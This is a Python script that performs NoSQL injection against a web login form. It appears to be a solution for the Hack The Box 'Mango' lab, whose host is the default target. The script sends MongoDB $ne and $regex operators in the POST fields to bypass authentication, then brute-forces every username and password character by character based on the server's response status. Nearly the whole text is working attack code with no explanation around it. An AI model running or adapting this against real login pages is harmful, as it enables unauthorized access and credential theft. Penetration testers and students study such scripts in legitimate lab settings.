import requests
import argparse


def is_password_complete(password):
    return is_injectable({"username": username, "password": password, "login": "login"})


def is_username_complete(username):
    return is_injectable({"username": username, "password[$ne]": "", "login": "login"})


def is_complete(secret):
    if username_enumeration:
        return is_username_complete(secret)
    else:
        return is_password_complete(secret)


def get_password_querry(payload):
    return {"username": username, "password[$regex]": "^" + payload, "login": "login"}


def get_username_querry(payload):
    return {"username[$regex]": "^" + payload, "password[$ne]": "", "login": "login"}


def get_querry(payload):
    if username_enumeration:
        return get_username_querry(payload)
    else:
        return get_password_querry(payload)


def is_injectable(data):
    r = requests.post(url, data=data, allow_redirects=False)  # proxies={'http':'localhost:8080'}
    if r.status_code != 200:
        return True


def find_next_letters(secret):
    found_letters = []
    for i in range(32, 127):  # ASCII decimal - alphanum + special symbols
        if chr(i) in "*.?^$|+":  # nosql regex special symbols
            continue
        else:
            next_letter = chr(i)

        if not username_enumeration:
            print("\r{}:{}".format(username, secret + next_letter), flush=False, end='')
        elif not found_letters:
            print("\r" + secret + next_letter, flush=False, end='')

        if is_injectable(get_querry(secret + next_letter)):
            found_letters.append(next_letter)

        if found_letters and not username_enumeration:  # for password is relevant just first letter occurrence
            break

    return found_letters


def find_secret(found, secret=""):
    if is_complete(secret):
        found.append(secret)
        print()
    else:
        for next_letter in find_next_letters(secret):
            find_secret(found, secret + next_letter)
    return found


parser = argparse.ArgumentParser()
parser.add_argument("-u", default='http://staging-order.mango.htb/')
args = parser.parse_args()
url = args.u

print("Enumerating usernames ...")
username_enumeration = True
usernames = find_secret([])

print("Enumerating passwords ...")
username_enumeration = False
for username in usernames:
    find_secret([])
